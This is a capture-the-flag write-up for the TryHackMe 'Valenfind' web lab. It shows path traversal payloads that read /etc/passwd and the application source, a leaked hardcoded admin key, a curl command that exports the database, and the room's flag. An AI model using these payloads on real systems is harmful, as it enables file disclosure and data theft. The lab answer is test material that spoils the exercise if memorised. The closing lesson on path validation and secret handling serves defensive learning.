# TryHackMe: Valenfind

**Category:** Web Exploitation
**Tooling:** Nmap, dirsearch, curl
**Techniques:** Path traversal (LFI), source code disclosure, hardcoded credential discovery, API authentication bypass via leaked token

---

## Overview

Valenfind is a "vibe-coded" dating site — an app built quickly with AI assistance and minimal security review. The investigation starts with basic recon, escalates through a path traversal vulnerability in a theme-loading endpoint to leak the application's own source code, and ends with extracting a hardcoded admin API key directly from that source to access a protected database export endpoint.

---

## 1. Recon

Ran Nmap and dirsearch against the target, finding an open web service on **port 5000**. The app displayed a dating-site UI with a "vibe coded" feel — a strong signal to check for classic AI-assisted-development vulnerabilities like unsanitized file paths or hardcoded secrets.

---

## 2. Investigation

### Step 1 — Identifying the vulnerable endpoint

Inspected the site's dev tools and noticed a layout-loading parameter:
```
/api/fetch_layout?layout=default
```

This looked like a strong candidate for **path traversal**, since it takes a filename directly as user input.

### Step 2 — Confirming path traversal

Tested traversal payloads:
```
/api/fetch_layout?layout=../../../../etc/passwd
/api/fetch_layout?layout=../../../../proc/self/cmdline
```

Both succeeded, confirming arbitrary file read. Using `/proc/self/cmdline` revealed the running application's script path: `/opt/Valenfind/app.py`.

### Step 3 — Leaking the application source code

```bash
curl http://10.130.176.24:5000/api/fetch_layout?layout=../../../../opt/Valenfind/app.py
```

This returned the full Flask application source code.

### Step 4 — Finding the hardcoded admin key

Reviewing the leaked source revealed a hardcoded admin API key sitting directly in plaintext — a very common flaw in AI-generated ("vibe-coded") applications where secrets are inlined rather than pulled from environment variables:

```python
ADMIN_API_KEY = "CUPID_MASTER_KEY_2024_XOXO"
```

The same source also revealed a protected endpoint that uses this key for authentication:

```python
@app.route('/api/admin/export_db')
def export_db():
    auth_header = request.headers.get('X-Valentine-Token')
    if auth_header == ADMIN_API_KEY:
        return send_file(DATABASE, as_attachment=True, download_name='valenfind_leak.db')
    else:
        return jsonify({"error": "Forbidden", "message": "Missing or Invalid Admin Token"}), 403
```

### Step 5 — Exfiltrating the database

```bash
curl -H "X-Valentine-Token: CUPID_MASTER_KEY_2024_XOXO" http://10.66.135.132:5000/api/admin/export_db --output cupid.db
```

Opening the downloaded `cupid.db` SQLite file revealed the flag.

---

### Q1 — Flag

**Answer:**
```
THM{v1be_c0ding_1s_n0t_my_cup_0f_t3a}
```

---

## Key Lesson

This room is a practical demonstration of two compounding vulnerabilities common in quickly AI-generated web apps: **unsanitized user-controlled file paths** (leading to path traversal and full source code disclosure) and **hardcoded secrets** left directly in application code. The `/api/fetch_layout` endpoint's blocklist approach (blocking `cupid.db` and `seeder.py` by name) was easily bypassed since it never validated the resolved path stays within the intended directory — a textbook case for why path traversal defenses need canonicalization and directory allowlisting, not filename blocklisting. Once source disclosure was achieved, the rest of the compromise was trivial: no exploit needed, just reading the plaintext admin key straight out of the code.
